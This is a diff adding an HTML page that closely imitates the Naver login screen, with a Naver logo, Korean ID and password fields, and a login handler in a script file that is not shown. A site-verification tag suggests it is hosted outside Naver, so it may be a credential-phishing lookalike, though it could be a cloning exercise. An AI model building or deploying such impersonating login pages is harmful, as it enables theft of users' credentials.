@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="google-site-verification" content="PCfkPk0q8D9CSUwiFZcGHxb5Ix4eNkbELEg-lvcvkZQ" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>네이버 : 로그인</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <img src="01 NAVER Logo_Green.png" alt="Naver Logo" class="logo" />
+  <div class="login-container">
+    <div id="login-form">
+      <div class="input-group">
+        <div class="input-wrapper top">
+          <input type="text" id="username" name="username" placeholder=" " required />
+          <label for="username">아이디 또는 전화번호</label>
+        </div>
+        <div class="input-wrapper bottom">
+          <input type="password" id="password" name="password" placeholder=" " required />
+          <label for="password">비밀번호</label>
+        </div>
+      </div>
+
+      <button type="submit" id="login-button" class="login-button" onclick="handleLogin()" disabled>로그인</button>
+    </div>
+  
+
+    <div class="link-container">
+      <span>비밀번호 찾기</span>
+      <span>아이디 찾기</span>
+      <span>회원가입</span>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
